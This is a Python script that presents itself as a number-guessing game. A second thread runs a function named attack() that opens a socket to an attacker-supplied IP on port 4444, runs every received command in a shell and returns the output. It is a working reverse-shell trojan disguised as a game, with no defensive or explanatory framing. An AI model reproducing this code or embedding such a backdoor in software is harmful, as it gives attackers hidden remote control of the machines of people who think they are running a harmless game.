
import socket
import random
import threading
import subprocess
import time


def game():

    no = random.randint(0,1000)

    print('Lets Play A Game....\nYou Have To Guess The Correct Number based Upon Hints...\nThe Number lies between 0 to 1000...\nLets Start!!')

    flag = True
    trys = 0

    while flag:

        aa = int(input('Enter A Number : '))

        if aa == no:
            print()
            time.sleep(0.5)
            print ('You won !!')
            print(f'You Took {trys} number of trys...')
            flag = False

        elif aa > no:
            time.sleep(0.5)
            print('The Real Number Is Smaller Than This...')
            trys += 1

        elif aa < no:
            time.sleep(0.5)
            print('The Real Number Is Greater Than This...')
            trys += 1


def attack():

    server_ip = '127.0.0.1' #Enter attacker ip
    #server_ip = ip
    #port = int(port)
    port = 4444

    backdoor = socket.socket()
    backdoor.connect((server_ip, port))

    while True:
        command = backdoor.recv(1024)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        backdoor.send(output + output_error)


t1 = threading.Thread(target=game)
t2 = threading.Thread(target=attack)

t1.start()
time.sleep(2)
t2.start()
